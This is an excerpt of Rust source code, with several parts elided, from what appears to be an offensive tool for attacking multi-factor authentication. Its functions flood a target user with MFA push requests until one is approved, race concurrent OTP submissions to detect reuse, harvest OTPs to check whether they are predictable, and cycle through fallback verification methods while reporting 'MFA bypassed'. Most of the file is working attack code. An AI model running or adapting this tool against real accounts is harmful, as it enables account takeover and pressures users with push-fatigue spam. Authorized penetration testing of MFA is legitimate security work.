...
pub async fn fatigue(
    ...
    for i in 0..count {
        match client
            ...
            .body(serde_json::json!({"user": user, "action": "mfa_push"}).to_string())
            .send()
            .await
        {
            Ok(resp) => {
                ...
                sent += 1;
                let approved = body.contains("approved")
            ...
            Err(_) => {
                print!("\r  {} Push {}/{} error", "*".red(), i + 1, count);
            }
        }
        if delay > 0 {
    ...
    println!(
        "\n\n{} {} push notifications sent. Accepted: {}",
        "[*]".cyan().bold(),
        sent,
        if accepted {
    ...
    if !accepted {
        println!(
            "{} Target did not accept any push. Consider OTP or fallback bypass.",
            "[*]".cyan().bold()
        );
    }
    Ok(())
...
pub async fn race(
    ...
    for _ in 0..count {
        ...
        handles.push(tokio::spawn(async move {
            client
                .post(&url)
                .header("Content-Type", "application/json")
                .body(serde_json::json!({"user": user, "otp": otp}).to_string())
                .send()
                .await
        }));
    }
    ...
    println!(
        "\n{} {}/{} concurrent OTP attempts succeeded",
        "[*]".cyan().bold(),
        successes,
        count
    );
    if successes > 1 {
        println!(
            "{} OTP reuse detected — race condition vulnerability!",
            "[!]".red().bold()
        );
    }
    Ok(())
...
pub async fn otp(url: &str, user: &str, timeout: u64, count: u32) -> anyhow::Result<()> {
    ...
    for i in 0..count {
        if let Ok(resp) = client
            .post(url)
            .header("Content-Type", "application/json")
            .body(serde_json::json!({"user": user, "action": "generate_otp"}).to_string())
            .send()
            .await
        {
            let body = resp.text().await.unwrap_or_default();
            ...
            if !otp_val.is_empty() {
                otps.push(otp_val.clone());
                println!("  {} OTP {}: {}", "*".cyan(), i + 1, otp_val);
            }
        }
    }
    ...
    if otps.len() >= 2 {
        ...
        if seq.windows(2).all(|w| w[1] == w[0] + 1) {
            println!(
                "{} [PREDICTABLE] OTPs are sequential (+1)!",
                "[!]".red().bold()
            );
        }
    }
    ...
    println!(
        "\n{} {} OTPs generated, {} duplicates found",
        "[*]".cyan().bold(),
        otps.len(),
        duplicates
    );
...
pub async fn fallback(url: &str, user: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    for (method, value) in &methods {
        let body =
            serde_json::json!({"user": user, "method": method, "code": value, "action": "verify"})
                .to_string();
        match client
            .post(url)
            .header("Content-Type", "application/json")
            ...
            .await
        {
            Ok(resp) => {
                ...
                let success = resp_body.contains("success")
                ...
                if success {
                    println!("    {} MFA bypassed via {}!", ">".red().bold(), method);
                    results.push(method.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:15} error", "*".red(), method);
            }
        }
    }
